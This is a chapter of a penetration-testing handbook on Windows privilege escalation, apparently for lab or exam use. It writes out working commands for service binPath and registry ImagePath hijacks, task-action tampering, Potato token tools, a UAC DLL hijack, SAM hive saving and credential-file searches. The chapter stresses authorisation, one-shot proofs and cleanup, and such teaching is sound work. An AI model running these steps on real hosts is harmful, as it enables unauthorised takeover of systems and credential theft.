# 06 · Windows privilege escalation

Use this chapter only on an authorised lab or assessment host, after a shell from
[§03](03-shells-and-payloads.md). The default proof is a **one-shot identity/integrity/token
check** (`whoami /all`, a `proof.txt` written by the elevated context), never a reverse shell, a
new administrator, a hive dump, or persistence. Every card that changes a file, service, task,
registry value, or ACL **captures original state first and restores it exactly**.

Placeholders: `TARGET_HOST`, `ATTACKER_IP`, `CALLBACK_PORT`, `<user>`, `<service>`, `<task>`,
`<path>`, `<registry-key>`, `<binary>`.

**Two speeds:** a fast card (precondition → 2–5 discovery/proof commands → success/stop → route →
cleanup); extended build/version/race reasoning lives in `<details>`.

**Boundary:** credential *discovery* is a local lead here; extraction/cracking/reuse routes to
[§04](04-password-attacks.md), domain/AD to [§08](08-active-directory.md), lateral movement to
[§07](07-pivoting-and-tunneling.md), tool/payload staging to [§09](09-file-transfers.md), and
post-elevation loot to [§10](10-post-exploitation-and-loot.md). No LLMNR/Responder, forced
authentication, or spoofing appears in this chapter.

**Jump:** [fast pass](#61-fast-pass-and-proof-standard) ·
[automated](#62-automated-corroboration) · [credentials](#63-credential-and-configuration-leads) ·
[service preflight](#64-service-preflight) · [writable service exe/dir](#65-writable-service-executable-or-directory) ·
[unquoted path](#66-unquoted-service-path) · [service DACL/registry](#67-modifiable-service-object-or-registry-acl) ·
[tasks/autoruns/installer](#68-scheduled-tasks-autoruns-and-installer-policy) ·
[token privileges](#69-token-privileges) · [privileged groups](#610-built-in-privileged-groups) ·
[UAC](#611-uac-and-the-filtered-administrator-token) ·
[PATH/DLL load](#612-file-registry-path-and-dll-controlled-load-paths) ·
[pipes/local services](#613-named-pipes-ipc-and-vulnerable-local-services) ·
[hives/backups](#614-backups-hives-event-logs-and-mounted-images) ·
[CVE gate](#615-kernel-and-platform-cves-last-resort) ·
[routes/exclusions](#616-routes-and-excluded-companions) · [verify/cleanup](#617-verify-clean-up-and-re-enumerate).

## 6.1 Fast pass and proof standard

### Identity, token, integrity, and session

```cmd
whoami /all                    :: SID, groups, and privileges in one view
whoami /priv                   :: note which privileges are Enabled vs Disabled
whoami /groups                 :: integrity level (Medium/High/System) + group SIDs
echo %USERNAME% & echo %COMPUTERNAME%
```

Record: integrity level (Medium = filtered token even for an admin; see
[§6.11](#611-uac-and-the-filtered-administrator-token)), which privileges are **Enabled** vs merely
present, process/shell architecture (32- vs 64-bit affects PATH and `sc.exe` resolution), and
whether this is an interactive or service token. A privilege that is *present but disabled* is a
lead, not a usable primitive.

### OS, build, patches, and software

```cmd
systeminfo                     :: OS, build, architecture, and hotfix list
wmic qfe get HotFixID,InstalledOn   :: legacy; may be incomplete for some update types
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName
reg query "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName
```

```powershell
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 15
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,`
  HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher | Sort-Object DisplayName
```

**Correction:** a recent "last KB" does not prove a CVE is missing (supersedence), and `Get-HotFix`
/QFE miss some update types. Do not use `Win32_Product`/`wmic product` — it is slow and can trigger
MSI repairs. Prefer the uninstall registry keys plus file/service versions.

### Processes, services, tasks, listeners, pipes, shares

```powershell
Get-CimInstance Win32_Service | Select-Object Name,State,StartMode,StartName,PathName |
  Where-Object State -eq 'Running'
Get-Process | Select-Object Name,Id,Path
Get-ScheduledTask | Where-Object State -ne 'Disabled' | Select-Object TaskName,TaskPath
netstat -ano                   :: map loopback-only listeners (privileged local services)
Get-ChildItem \\.\pipe\        :: named-pipe inventory (a broad DACL is a lead, not a win)
net share
```

Prioritise loopback-only privileged listeners and non-default services; map each
process → service → account → listener. All of this is context — a finding is a lead until a
higher-identity consumer, a controllable input, and a trigger are proven.

### Defensive controls (read-only preconditions)

```cmd
powershell -c "Get-MpComputerStatus | Select RealTimeProtectionEnabled,AntispywareEnabled"
powershell -c "Get-AppLockerPolicy -Effective | Select -Expand RuleCollections"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

Defender/AppLocker/WDAC/UAC state decides which proof is even runnable. Read the **effective**
policy (`-Effective`, not `-Local`). These are execution constraints to plan around, not things to
bypass; no evasion belongs in this chapter.

### Proof standard

Success is a fresh effective token: run `whoami /all` (or write `proof.txt`) from the elevated
context. Container/service/database identities are named honestly and are not silently "SYSTEM".
Every mutable card below follows **discovery → prerequisites → controlled input → trigger →
identity proof → stop/next → exact cleanup**, and captures original bytes/ACL/config/state before
any change.

## 6.2 Automated corroboration

Run a locally staged, version-pinned enumerator **after** the manual pass, then re-verify each hit
by hand. Acquisition and hashing route to [§09](09-file-transfers.md); do not stage with a default
outbound `certutil` download.

```powershell
.\winPEASx64.exe                       # match architecture; a colour is a lead, not proof
. .\PowerUp.ps1 ; Invoke-AllChecks     # reviewed local copy, not remote IEX
Get-UnquotedService                    # → §6.6 candidates
Get-ModifiableService                  # → §6.7 service-object DACL candidates
Get-ModifiableServiceFile              # → §6.5 writable executable/path candidates
.\Seatbelt.exe -group=all
```

**Correction:** execution policy is not a security boundary, and a remote in-memory `IEX` load of an
unpinned script is excluded — stage a reviewed copy and record its version/hash. Every PowerUp/PEAS
finding is re-proven with native `sc.exe qc`, `icacls`, and `whoami` before you act on it.

<details>
<summary>PowerUp false negative → manual proof (recognisable case)</summary>

`Get-ModifiableServiceFile` can flag a service (e.g. one whose `PathName` includes arguments such as
`mysqld.exe --defaults-file=...`) yet its `Install-ServiceBinary` abuse function throws
"not modifiable" because `Get-ModifiablePath` parses the whole command line, arguments included, and
returns empty. When automation fails like this, fall back to the raw evidence: compare the literal
executable-only path against the full `PathName`, then prove control directly:

```powershell
(Get-CimInstance Win32_Service -Filter "Name='<service>'").PathName   # note args after the .exe
icacls "C:\path\to\<binary>.exe"                                       # BUILTIN\Users:(M)/(F)?
```

If `icacls` shows Modify/Full on the exact executable, proceed manually via
[§6.5](#65-writable-service-executable-or-directory); the tool's negative is not a stop.

</details>

## 6.3 Credential and configuration leads

Discovery only — a match is a candidate, never a confirmed login. Do not print or copy secret
values into notes; route validation/cracking/reuse to [§04](04-password-attacks.md).

### Unattended install, PowerShell history, IIS, PuTTY

```cmd
:: Unattended answer files (values may be absent, redacted, Base64, or PlainText=false)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
:: PowerShell history (cmd form; from PowerShell use $Env:userprofile)
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
:: IIS/.NET config connection strings (web root and framework-level Config)
type C:\inetpub\wwwroot\web.config | findstr /i connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr /i connectionString
:: PuTTY stored *proxy* credentials (Simon Tatham = author, not a username)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

```powershell
(Get-PSReadlineOption).HistorySavePath     # confirm the real history path first
Get-ChildItem C:\Users -Recurse -Include *.config,*.ini,*.xml,*.txt,*.ps1 -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|passwd|pwd|connectionString'   # regex; NOT -SimpleMatch
```

**Corrections:** Base64 is encoding, not encryption — do not call every `<Value>` a cleartext
password; encrypted `web.config` sections and integrated auth are stop conditions; a
`connectionString` match is not itself a credential. Combining an alternation string with
`-SimpleMatch` searches for the literal `a|b|c` text and matches nothing — use a real regex.

### PowerShell Script Block Logging (Event 4104)

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Where-Object Id -eq 4104 |
  Select-Object -ExpandProperty Message |
  Select-String 'password','cred','ConvertTo-SecureString' -Context 0,2
```

4104 may record script-block fragments. **Stop conditions:** logging can be disabled, the log can
roll over, access can be denied, and one script may be split across events — a missing event is a
stop result, not proof no secret was used. Keep the log intact; never export unrelated event
content.

### Saved credentials and alternate-user execution

```cmd
cmdkey /list                          :: shows saved TARGETS/usernames, never passwords
runas /savecred /user:<user> "cmd /c whoami > %TEMP%\oscp-runas.txt"
```

**Correction:** a saved `TERMSRV/HOST` entry does not authorise arbitrary
`runas /savecred /user:<anyone>`; match the exact saved target/type/context, and note that
`runas /savecred` may itself prompt for and store a new credential. Browsers, password managers,
FTP/SSH/VNC clients, DPAPI vaults, and AutoLogon (`HKLM\...\Winlogon` `AutoAdminLogon`) are further
*discovery* leads — inventory locations here, route recovery to [§04](04-password-attacks.md), and
keep no values.

## 6.4 Service preflight

Do this once before any service card ([§6.5](#65-writable-service-executable-or-directory)–[§6.7](#67-modifiable-service-object-or-registry-acl)).
The five findings are distinct and not interchangeable: **executable ACL**, **containing-directory
ACL**, **service-object DACL**, **service-registry ACL**, and **unquoted path**.

```powershell
# 1. Inventory (include stopped services; a default query can miss them).
Get-CimInstance Win32_Service | Select-Object Name,StartName,StartMode,State,PathName
```

```cmd
:: 2. Deep-dive one service. In PowerShell use sc.exe (bare `sc` = Set-Content alias).
sc.exe qc "<service>"          :: BINARY_PATH_NAME, SERVICE_START_NAME, START_TYPE
sc.exe qc "<service>" | findstr /i "BINARY_PATH_NAME SERVICE_START_NAME START_TYPE"
icacls "C:\path\to\<binary>.exe"           :: executable ACL
icacls "C:\path\to\"                        :: containing-directory ACL
sc.exe sdshow "<service>"                   :: service-object DACL (or accesschk64 -qlc)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath   :: registry ACL target
```

Capture, before touching anything: the service account, exact binary path **and arguments**, start
type/state, and whether the current user can stop/start it. Write these down as your rollback
baseline. From a 32-bit shell resolve `sc.exe` via `C:\Windows\Sysnative\sc.exe` to avoid WOW64
redirection.

**Correction:** the payload is **not** "always an exe-service binary". Direct executable replacement
needs a service-compatible binary (it must speak the SCM protocol) — but a writable `binPath` or a
scheduled action can instead run a one-shot `cmd /c` command, which commonly returns SCM error 1053
*after* the command already executed. Choose the least-invasive proof for the actual consumer.

## 6.5 Writable service executable or directory

**Context:** SCM runs an existing service binary as its configured (often elevated) account, and you
have Modify/Full on that exact executable (or on its containing directory).

```cmd
sc.exe qc "<service>"                          :: account + BINARY_PATH_NAME
icacls "C:\path\to\<binary>.exe"               :: (M)/(F) for Users/Everyone on the exact file?
:: Capture a rollback baseline FIRST:
copy "C:\path\to\<binary>.exe" "%TEMP%\oscp-svc.bak"
certutil -hashfile "C:\path\to\<binary>.exe" SHA256 > "%TEMP%\oscp-svc.hash"
```

Replace with a service-compatible proof artifact (route generation to
[§03](03-shells-and-payloads.md)/[§09](09-file-transfers.md)), then trigger and prove:

```cmd
move "C:\path\to\<binary>.exe" "C:\path\to\<binary>.exe.orig"
move "%TEMP%\oscp-proof-svc.exe" "C:\path\to\<binary>.exe"
sc.exe stop "<service>" & sc.exe start "<service>"   :: only if you hold start/stop rights
:: proof: the service account writes proof.txt, then restore:
move /y "C:\path\to\<binary>.exe.orig" "C:\path\to\<binary>.exe"
```

Success is `proof.txt`/`whoami` as the service account. **Stop/correct:** a writable file does **not**
imply `SERVICE_STOP`/`SERVICE_START` — if you cannot restart, wait for a natural restart or use an
explicitly authorised reboot (a separate, disruptive trigger). Do **not** `icacls /grant Everyone:F`
as the source did, do not move a running binary blindly, and do not rely on 8.3 short names. Restore
the original bytes/ACL and prior service state.

## 6.6 Unquoted service path

**Context:** a service's `BINARY_PATH_NAME` contains spaces and is not quoted, so Windows
process-creation tries each earlier candidate in turn — and an earlier candidate directory is
writable by you.

```cmd
sc.exe qc "<service>"          :: e.g. C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe (unquoted)
```

For `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` the probe order is:

```text
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe   (intended)
```

```cmd
icacls "C:\MyPrograms"         :: need (WD)/(AD) for Users on a directory holding an EARLIER candidate
:: confirm the earlier candidate is ABSENT, then plant a matching proof artifact:
move "%TEMP%\oscp-proof-svc.exe" "C:\MyPrograms\Disk.exe"
sc.exe stop "<service>" & sc.exe start "<service>"     :: or authorised restart/wait
del "C:\MyPrograms\Disk.exe"                            :: cleanup: remove only what you planted
```

Success is proof as the service account. **Corrections:** an unquoted path alone is not enough — you
need an *absent* earlier candidate, an actual write right on its parent, an elevated consumer, and a
trigger. This is process-creation ambiguity, not command-prompt parsing. `C:\Program Files` is
normally not writable, so ACL evidence is mandatory; never add `Everyone:F`. Derive candidates from
the *exact* path (`.exe` on each), and treat the legacy `wmic ... | findstr` pipeline as a brittle
lead only.

## 6.7 Modifiable service-object or registry ACL

**Context:** you cannot write the binary, but the service-object DACL (or the service's registry key)
lets you reconfigure where SCM points.

### Service-object DACL

```cmd
accesschk64.exe -qlc "<service>"     :: SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS for Users?
sc.exe qc "<service>" > "%TEMP%\oscp-svc-config.txt"   :: capture original binPath + obj FIRST
sc.exe config "<service>" binPath= "cmd /c whoami > C:\Windows\Temp\oscp-svc.txt"
sc.exe stop "<service>" & sc.exe start "<service>"     :: SCM 1053 is expected for a one-shot cmd
:: restore the exact original binPath (and obj) from the captured config, then:
type C:\Windows\Temp\oscp-svc.txt
```

Success is the identity written by the reconfigured service. **Corrections:** treat
`SERVICE_CHANGE_CONFIG`, `SERVICE_START`, and `SERVICE_STOP` **separately** — change-config does not
imply restart rights. Preserve the existing elevated account; do **not** gratuitously add
`obj= LocalSystem` unless account control is the actual flaw (arbitrary accounts also need
credentials/logon rights). Mind the required space after `binPath=`. Restore every captured field and
the prior state.

### Service-registry ACL (distinct finding)

**Context:** `HKLM\SYSTEM\CurrentControlSet\Services\<service>` (its `ImagePath`) is writable even
though the service-object DACL is not.

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath   :: capture original value
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ ^
  /d "cmd /c whoami > C:\Windows\Temp\oscp-reg.txt" /f
sc.exe stop "<service>" & sc.exe start "<service>"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ ^
  /d "<original-value>" /f          :: restore exactly
```

A writable **registry key** and a writable **service-object DACL** are different discoveries needing
different checks; keep them as separate cards. Success is the identity proof; restore the exported
value and service state.

## 6.8 Scheduled tasks, autoruns, and installer policy

### Scheduled task with a writable action

**Context:** a task runs as a higher-privileged principal and its action file (or an earlier
resolution path) is writable by you.

```cmd
schtasks /query /tn "<task>" /fo LIST /v      :: Task To Run + Run As User + triggers
icacls "C:\path\to\<task-action>.bat"          :: (F)/(M) for Users?
copy "C:\path\to\<task-action>.bat" "%TEMP%\oscp-task.bak"     :: back up FIRST
echo whoami ^> C:\Windows\Temp\oscp-task.txt >> "C:\path\to\<task-action>.bat"
schtasks /run /tn "<task>"                      :: only if you may start it; else record and wait
copy /y "%TEMP%\oscp-task.bak" "C:\path\to\<task-action>.bat"  :: restore exact content
```

Success is proof as the task principal. **Corrections:** map an actual task → action → principal —
do not assume a random writable `.bat` is scheduled. Back up and restore exact bytes; the source's
`echo >` *overwrites* the action (destructive) and its "append a beacon and wait overnight" is
persistence — excluded. If you cannot start the task, record the finding and wait for the natural
trigger rather than planting-and-waiting.

### AlwaysInstallElevated (both policy hives)

**Context:** the Windows Installer runs your MSI elevated **only** when both per-user and machine
policy values are enabled.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: BOTH must be 0x1. Then run a benign one-shot MSI (build via §03):
msiexec /quiet /qn /i C:\Windows\Temp\oscp-proof.msi
```

Success is elevated-installer identity. **Corrections:** one key set is insufficient — require both.
Prefer a one-shot identity proof over a persistent payload, and exclude `Write-UserAddMSI`/account-
creation MSIs. If the MSI registers a product, uninstall it; delete the MSI and its logs.

### Registry Run/autorun (conditional — usually persistence)

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Correction:** most autoruns execute as the same logging-on user, and *adding* an autorun is
persistence, not escalation. This is only a lead if a **higher-identity** user's logon is the
consumer and you can modify the exact Run value or the referenced binary (verify both ACLs). A key
listing alone proves neither writability nor a privileged consumer — route the mutation path to
[§10](10-post-exploitation-and-loot.md).

## 6.9 Token privileges

Read `whoami /priv` first and split by primitive. A privilege that is **present but disabled**, or
present without a compatible OS/build/service, is a lead — not an automatic win.

### SeImpersonate / SeAssignPrimaryToken (service accounts, IIS, MSSQL)

**Context:** an enabled impersonation privilege plus a compatible local COM/RPC/spooler primitive can
yield SYSTEM. The "Potato" tools are **not** interchangeable.

```cmd
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
:: choose ONE pinned, reviewed tool matching the OS/build/service; prove with whoami first:
PrintSpoofer64.exe -c "cmd /c whoami > C:\Windows\Temp\oscp-sys.txt"
GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\oscp-sys.txt"
```

Success is SYSTEM in the spawned process (`whoami`). **Prerequisite matrix, not brand names:**
PrintSpoofer needs the Spooler/named-pipe path; RoguePotato needs an OXID resolver/redirector
(`-r <ATTACKER_IP>`) and outbound RPC; JuicyPotato is build/DCOM/**CLSID**-sensitive and generally
dead on modern builds; GodPotato/SweetPotato depend on the .NET runtime and OS range. Verify each
tool/version against upstream ([§09](09-file-transfers.md) staging); keep callback syntax in
[§03](03-shells-and-payloads.md). If MSSQL `xp_cmdshell` is the initial channel, capture and restore
`xp_cmdshell`/advanced-options state.

### SeDebugPrivilege → SYSTEM child

**Context:** `SeDebugPrivilege` lets you open a handle to a SYSTEM process and spawn a child under its
token.

```cmd
whoami /priv | findstr /i SeDebug
:: with a reviewed local PoC (e.g. psgetsys / ImpersonateFromParentPid), pick a stable SYSTEM PID:
tasklist /v | findstr /i "winlogon lsass"
:: spawn a one-shot child: whoami /all  → proof it runs as SYSTEM
```

Success is a SYSTEM child token. Note that being able to open an elevated shell may already imply
admin; state what SeDebug specifically adds. Route credential/LSASS **dumping** out —
[§6.14](#614-backups-hives-event-logs-and-mounted-images) / [§04](04-password-attacks.md) — it is not
this card. Terminate the proof child and remove the staged PoC.

### SeBackup / SeRestore / SeTakeOwnership (distinct capabilities)

These are **not** "read/overwrite anything". Each is a specific primitive with its own semantics and
rollback.

```cmd
whoami /priv | findstr /i "SeBackup SeRestore SeTakeOwnership"
:: SeBackup: backup-intent read of a protected file to a readable copy (harmless proof file first)
robocopy /B "C:\ProtectedDir" "%TEMP%\oscp-backup" proof.txt
:: SeTakeOwnership: take ownership of a target object, then read/replace with authorisation
takeown /f "C:\path\to\<protected>"     :: capture original owner/DACL FIRST; restore after
```

**Corrections:** enabling a privilege is a real step — a script that never calls its setter has not
enabled it; confirm the token state. `SeBackup` is a protected-file **read/copy** primitive (route
hive/hash handling to [§6.14](#614-backups-hives-event-logs-and-mounted-images)/[§04](04-password-attacks.md)),
not arbitrary write. For `SeTakeOwnership`, capture the exact original owner and DACL, request the
minimum right (avoid blanket `icacls /grant ...:F`), and restore owner/DACL/file afterwards; changing
a live config/binary can break the service.

<details>
<summary>SeLoadDriver (high risk, detail only)</summary>

`SeLoadDriverPrivilege` can load a signed-but-vulnerable driver (e.g. Capcom) to reach the kernel.
This can crash or weaken the host and is gated by UAC token state, architecture, driver
signature/blocklist and HVCI. Treat as a disposable-lab, last-resort CVE-style path
([§6.15](#615-kernel-and-platform-cves-last-resort)); unload the driver, delete the registry service
key/binary, and reboot only if agreed.

</details>

## 6.10 Built-in privileged groups

Local group membership can grant a capability without administrator rights. Keep **local-host**
mechanics here; route any **domain-controller** action to [§08](08-active-directory.md).

```cmd
whoami /groups
net localgroup
```

- **Backup Operators / `SeBackupPrivilege`** — backup-mode read of protected files; use the
  [§6.9](#69-token-privileges) SeBackup card. On a DC this reaches `NTDS.dit` → **route to
  [§08](08-active-directory.md)**, not here.
- **Event Log Readers** — read Security event `4688` command lines for credential leads; narrow the
  query, route secrets to [§04](04-password-attacks.md). The remote `-Credential`/`/p` variant exposes
  a password in your own command line — excluded.
- **Hyper-V Administrators** — a version-gated `vmms.exe` hard-link primitive can replace a
  SYSTEM-service binary (mitigated March 2020); detail/rollback are as in
  [§6.5](#65-writable-service-executable-or-directory).
- **Print Operators (`SeLoadDriverPrivilege`)** — driver-load path; see the
  [§6.9](#69-token-privileges) high-risk note.
- **DnsAdmins / Server Operators** — `ServerLevelPluginDll`, service reconfiguration on a DC, and
  similar are **domain** actions → [§08](08-active-directory.md). Server Operators reconfiguring a
  *local* service links back to [§6.7](#67-modifiable-service-object-or-registry-acl).

## 6.11 UAC and the filtered administrator token

**Context:** UAC only elevates an **already-administrative** account whose interactive token is
filtered to Medium integrity. It never turns a standard user into an administrator.

```cmd
whoami /groups | findstr /i "S-1-5-32-544 Mandatory"   :: admin group + integrity level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
```

Recognisable path — `SystemPropertiesAdvanced.exe` / `srrstr.dll`: the 32-bit auto-elevating binary
searches a writable directory for `srrstr.dll`; place a compatible **x86** proof DLL there and launch
the exact 32-bit consumer for a high-integrity proof.

```powershell
# place x86 oscp-proof.dll (named srrstr.dll) in the writable searched dir, then:
C:\Windows\System32\SystemPropertiesAdvanced.exe   # 32-bit auto-elevating consumer
```

Success is a **High**-integrity/admin token (not merely the same user). **Corrections:**
`ConsentPromptBehaviorAdmin=5` is **not** "Always notify/highest" — evaluate the whole policy
including `PromptOnSecureDesktop`. UAC methods are build/tool-version dependent and frequently
patched; pin the method and gate on exact build. Remove the DLL and any spawned processes.

## 6.12 File, registry, PATH, and DLL controlled-load paths

**Context:** a higher-integrity process loads a module by name from a location you can write, or with
a missing DLL you can supply. A writable directory alone is **not** a hijack.

```cmd
echo %PATH%
for %p in (%PATH:;= %) do @echo %p & icacls "%p"      :: any Users-writable PATH dir?
```

```powershell
# In an owned lab, prove the load with Procmon: filter the elevated consumer for
# "NAME NOT FOUND" / "Load Image" on a DLL, and confirm the searched directory is writable.
icacls "C:\Vendor\App\"        # directory ACL for the exact search location
```

Then place a **bitness/export-compatible** benign DLL in the confirmed search location, trigger the
exact elevated consumer, and prove identity — restoring any file you renamed:

```cmd
:: back up an existing DLL before proxying it
ren "C:\Vendor\App\<library>.dll" "<library>.dll.orig"
:: drop compatible oscp-proof.dll as <library>.dll, trigger consumer, then restore
ren "C:\Vendor\App\<library>.dll.orig" "<library>.dll"
```

Success is proof in the elevated context. **Corrections:** you need an elevated consumer, a
controllable search position (application dir, KnownDLLs and Safe DLL Search Mode matter),
architecture/export match, and a real trigger — a writable `%PATH%` entry by itself proves nothing. A
proxy DLL must preserve exports/calling conventions and avoid heavy work in `DllMain`. Generic process
injection (LoadLibrary remote thread, manual/reflective mapping) is **excluded** — route to an
advanced companion.

## 6.13 Named pipes, IPC, and vulnerable local services

**Context:** a privileged service exposes a named pipe or a loopback endpoint that accepts client
input. A broad DACL is a lead; exploitation needs the server's protocol/version and a real primitive.

```cmd
:: enumerate pipes and the owning process/service
powershell -c "Get-ChildItem \\.\pipe\ | Select-Object Name"
:: map a loopback listener to a PID/service (often needs elevation for -b)
netstat -ano | findstr LISTENING
```

Success is the privileged server performing a controlled, harmless action after a **product/version-
qualified** request. **Corrections:** `RW Everyone` on a pipe is not itself code execution — pipe
protocol, server impersonation/validation, and owner context decide it (e.g. the Windscribe service
pipe needs the affected product/version and its specific request; an LSASS pipe ACL is not a generic
LSASS exploit). For a vulnerable local service (e.g. Druva inSync RPC on loopback), confirm exact
version and loopback-port→PID→account mapping, send one `whoami`/file proof through a reviewed PoC,
then dispose the socket and remove artifacts. Do not use `Win32_Product` to check the version.

## 6.14 Backups, hives, event logs, and mounted images

**Context:** a privilege/group lets you read protected credential stores. In `06` this is a
**capability boundary** — the payload (parsing/cracking/reuse) is out of scope.

```cmd
whoami /priv | findstr /i "SeBackup SeRestore"
:: live SAM is locked; SeBackup/backup-mode or a VSS/shadow copy is the actual read path
reg save HKLM\SAM  %TEMP%\oscp-sam   :: requires elevation; creates sensitive files
reg save HKLM\SYSTEM %TEMP%\oscp-sys
```

**Boundary/corrections:** the live SAM hive is normally locked, so plain `icacls` on it does not prove
access — affected pre-fix **shadow-copy** hives (HiveNightmare/SeriousSAM) or backup semantics are the
condition. `reg save` needs elevation and drops sensitive files. Recovering hashes/secrets is **not**
local escalation and must not be the default post-SYSTEM action — route hive/`NTDS.dit`/mounted-image
(VHD/VMDK) extraction to a bounded [§10](10-post-exploitation-and-loot.md)/[§04](04-password-attacks.md)
with fresh authorisation, log no secret values, and securely delete any copies. Domain-database and
DCSync/PtH follow-ons belong to [§08](08-active-directory.md).

## 6.15 Kernel and platform CVEs (last resort)

Only after configuration paths are exhausted. Match exact **build/SKU/architecture/patch** against a
current advisory (supersedence and vendor backports matter); a `systeminfo` build or an EOL label is
not enough.

```cmd
systeminfo                     :: build + hotfixes for advisory comparison
```

```powershell
Get-CimInstance Win32_QuickFixEngineering | Select-Object HotFixID, InstalledOn
# suggesters (WES-NG, Watson, Sherlock) run on the attack host; "Appears Vulnerable" is not applicability
```

| Candidate / family | Gate before staging |
|---|---|
| PrintNightmare (Spooler RPC) | Spooler endpoint present is only a prerequisite; exact build/patch + Point-and-Print policy |
| CVE-2020-0668 (Service Tracing → Mozilla Maintenance) | affected build; target service present/startable; compatible replace target |
| CVE-2019-1388 (UAC cert dialog) | GUI access, exact patch/browser behaviour |
| MS16-032 (Secondary Logon race) | Win7/2008 build, multi-core, patch state; race reliability |
| MS10-092 (Task Scheduler XML) | Vista/7/2008 build + architecture |
| SeriousSAM/HiveNightmare | readable **shadow-copy** hives on an affected build (→ [§6.14](#614-backups-hives-event-logs-and-mounted-images)) |

**Corrections:** never override a suggester/exploit "not vulnerable" check (e.g. Metasploit
`ForceExploit`) to force a run — require independent build/patch evidence and a disposable lab. These
can BSOD the host. Stage reviewed source via [§09](09-file-transfers.md); no default download-and-run,
and MS08-067/MS17-010-style "local through a forwarded port" changes scope and belongs with
[§07](07-pivoting-and-tunneling.md).

## 6.16 Routes and excluded companions

| Observation | Route |
|---|---|
| Candidate passwords/hashes/keys, browser/DPAPI/KeePass/mRemoteNG stores | [§04](04-password-attacks.md) |
| Shell delivery, handlers, WinRM/WMI/PsExec, MSI/service/DLL payload generation | [§03](03-shells-and-payloads.md) |
| Tool/artifact staging and transfer (certutil/IWR/SMB), version/hash | [§09](09-file-transfers.md) |
| Port forwarding, pivoting, "local through forwarded port" CVEs | [§07](07-pivoting-and-tunneling.md) |
| Domain/DC: DnsAdmins, Server Operators/NTDS, GPO, DCSync/PtH, credential reuse | [§08](08-active-directory.md) |
| Post-SYSTEM loot, hive/LSASS/backup extraction, restricted-desktop (Citrix) breakout | [§10](10-post-exploitation-and-loot.md) |

**Excluded from this chapter (not attack cards here):** creating a local admin / group changes /
Run-key or service backdoors (persistence); LSASS/SAM/NTDS **dumping**, browser-cookie/Slack-session
theft, KeePass cracking, LaZagne/SessionGopher bulk collection (credential collection); SCF/LNK forced
authentication, Responder/relay, WPAD, clipboard/traffic/keylogging (capture & spoofing); generic
process injection and detection-evasion. Replace every "add a user / dump hashes" habit with a
one-shot identity proof and an explicit route.

## 6.17 Verify, clean up, and re-enumerate

```cmd
:: 1. Proof — a fresh effective token, named honestly (SYSTEM vs a service/db account).
whoami /all
echo proof > C:\Windows\Temp\proof.txt & type C:\Windows\Temp\proof.txt

:: 2. Restore every mutated object from the baseline captured in its card:
::    service binPath/obj/state, task action bytes, registry ImagePath, file owner/DACL, DLLs, MSI.
:: 3. Remove only what you created; delete staged tools/hive copies/proof files.
```

State the real identity boundary: a service, database, or container identity is not silently host
SYSTEM. If elevation is partial, re-run `whoami /all`, `whoami /priv`, `net localgroup`, and the
service/task pass from the new identity ([§6.1](#61-fast-pass-and-proof-standard)). Leave nothing
behind — no new accounts, backdoors, planted binaries/DLLs, changed service/task/registry state, MSI
products, dumped hives, or listeners. Hand off credentials to [§04](04-password-attacks.md), transport
to [§07](07-pivoting-and-tunneling.md), domain work to [§08](08-active-directory.md), and loot to
[§10](10-post-exploitation-and-loot.md).

## References

- [GTFOBins](https://gtfobins.github.io/) has Unix analogues; for Windows, match each **service /
  token / group / CVE** finding to its exact primitive rather than a tool name.
- Version-sensitive items (Potato CLSIDs, PrintNightmare, UAC methods, kernel PoCs, PowerUp function
  behaviour) drift — verify against current primary/upstream documentation before use, and stage
  reviewed copies via [§09](09-file-transfers.md).
- Chapter handoffs are linked inline: shells [§03](03-shells-and-payloads.md), passwords
  [§04](04-password-attacks.md), pivoting [§07](07-pivoting-and-tunneling.md), Active Directory
  [§08](08-active-directory.md), transfers [§09](09-file-transfers.md), loot
  [§10](10-post-exploitation-and-loot.md).
